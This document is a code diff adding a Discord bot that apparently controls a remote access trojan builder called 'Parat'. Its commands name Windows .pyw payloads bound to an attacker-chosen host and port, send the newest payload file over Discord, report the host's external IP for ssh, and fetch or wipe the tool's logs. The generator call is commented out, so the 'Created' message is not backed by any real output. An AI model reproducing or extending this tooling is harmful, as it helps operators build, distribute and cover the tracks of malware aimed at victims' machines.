@@ -1,0 +1,112 @@
+#!/bin/env python
+
+import glob
+import os
+import urllib
+import discord
+from discord.ext import commands
+# from client import MakeOutput
+from random import choice
+from string import ascii_uppercase, ascii_lowercase, digits
+
+
+bot = commands.Bot(command_prefix='!')
+
+@bot.event
+async def on_ready():
+    print('Bot connected to Discord server')
+
+
+@bot.command()
+async def say_hello(ctx):
+    await ctx.send('Hello my friend ;)')
+    
+
+@bot.command()
+async def ssh(ctx):
+    user = os.getlogin()
+    ex_ip_grab = ['ipinfo.io/ip', 'icanhazip.com', 'ident.me', 'ipecho.net/plain', 'myexternalip.com/raw']
+    ip = ''
+    for url in ex_ip_grab:
+        try:
+            ip = urllib.request.urlopen('http://' + url).read().decode().rstrip()
+        except IOError:
+            pass
+        if ip and (6 < len(ip) < 16):
+            break
+    port = 22
+    await ctx.send(f'ssh -p {port} {user}@{ip}')
+
+
+@bot.command()
+async def generate(ctx, host, port, name=None):
+    if not name:
+        random_string = ''.join(choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(6))
+        output = f"Parat-x86_{random_string}.pyw"
+    else:
+        file_type = name.split('.')[-1:]
+        file_name = '.'.join(name.split('.')[:-1])
+
+        if file_type not in ['py', 'pyw']:
+            file_name = name
+
+        if file_type and not file_name:
+            file_name = "".join(file_type)
+            file_type = "py"
+
+        if file_type != "pyw":
+            name = '.'.join([file_name, "pyw"])
+        output = name
+
+    path = os.path.abspath('')
+    # MakeOutput(output, host, port, plat, arch, None, path)
+    msg = f"`{output}` Created:\n"
+    msg += f"  host: `{host}`\n"
+    msg += f"  port: `{port}`\n"
+    msg += f"  platform: `windows`\n"
+    msg += f"  arch: `x86`\n"
+
+    await ctx.send(msg)
+
+
+@bot.command()
+async def get_server(ctx):
+    newest_server = max(glob.iglob('parat_output/*.[Pp][Yy][Ww]'), key=os.path.getctime)
+    with open(newest_server, 'rb') as server_file:
+        await ctx.send(file=discord.File(server_file))
+
+
+@bot.command()
+async def get_logs(ctx):
+    os.chdir(os.path.join('conf', 'logs'))
+    try:
+        today_log = max(glob.iglob('*.log'), key=os.path.getctime)
+        with open(today_log, 'rb') as log_file:
+            await ctx.send(file=discord.File(log_file))
+    except Exception as e:
+        if "max() arg is an empty sequence" in str(e):
+            await ctx.send("No log found today!")
+        else:
+            await ctx.send(str(e))
+    os.chdir(os.path.join('../..'))
+
+
+@bot.command()
+async def clean_servers(ctx):
+    names = []
+    for server_file in glob.glob("*.[Pp][Yy][Ww]"):
+        names.append(server_file)
+        os.remove(server_file)
+    if len(names) > 0:
+        await ctx.send(f'All file(s) deleted successfully:\n`{", ".join(names)}`')
+
+
+@bot.command()
+async def clean_logs(ctx):
+    PathToLogFile = os.path.join('conf', 'logs', 'parat.log')
+    with open(PathToLogFile, "w") as rlog:
+        pass
+    await ctx.send('All logs deleted successfully.')
+
+
+bot.run('YOUR_DISCORD_TOKEN')
